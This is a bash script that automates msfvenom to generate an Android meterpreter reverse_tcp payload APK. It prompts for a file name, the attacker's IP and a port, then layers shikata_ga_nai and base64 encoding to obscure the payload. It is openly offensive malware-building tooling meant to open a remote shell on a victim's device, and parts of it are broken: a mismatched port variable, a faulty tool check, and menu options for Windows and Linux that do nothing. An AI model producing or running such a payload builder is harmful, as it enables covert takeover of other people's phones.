#!/bin/bash

echo -e "\033[2;5;4;32mDISCLAMAIRE\033[0m"

readd="\033[31m"
reset="\033[0m"

animation_chars="Please wait script is Checking requirements /-\|/-\|/-\|/-\|/-\|\-/|\-/|\-/|\-/|\-/|\-|\-/-\|/-\|/-\|\-/|"

for ((i=0; i<${#animation_chars}; i++)); do
	echo -ne "${readd}${animation_chars:i%${#animation_chars}:1}"
	echo -ne ${reset}
	sleep 0.1
done

echo

if $(msfconsole -v) && $(git -v); then
	echo "Tools is downloaded"
else
	echo "Tools are not downloaded"
	echo "Please Download them manually"
	exit 1
fi

sleep 3s  

echo "This script creates automatically payload using MSFVENOM"

sleep 1s

echo  "Kindly provide the OS you want use Payload in!"

sleep 1s

if [ $(whoami) = "root" ]; then
	echo "Good to go"
else
	echo -e "\033[31mPlease run this Script as SUPERUSER! \033[0m"
	exit 130
fi

echo "1 => Android"
echo "2 => Windows"
echo "3 => Linux"

read os

if [ ${os} = "1" ]; then
	echo -n "What name you would like to give to the Android payload => "
	read name 
	sleep 0.3
	echo -n "Enter you local IP address => "
	read lhost
	sleep 0.3
	echo -n "Enter your Port number => "
	read port
	$(sudo msfvenom -p android/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload1.apk)
	$(sudo msfvenom -x .payload1.apk --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload2.apk)
	$(sudo msfvenom -x .payload2.apk --encoder ruby/base64 -i 3 --arch dalvik --platform android LHOST=${lhost} LPORT=${lport} --out ${name}.apk)
	$(rm -rf .payload1.apk .payload2.apk)
	echo "Your payload is completed"
	echo "Please go to msfconsole to continue start your session"
	echo "Good Day"
else
	echo "Done"
fi

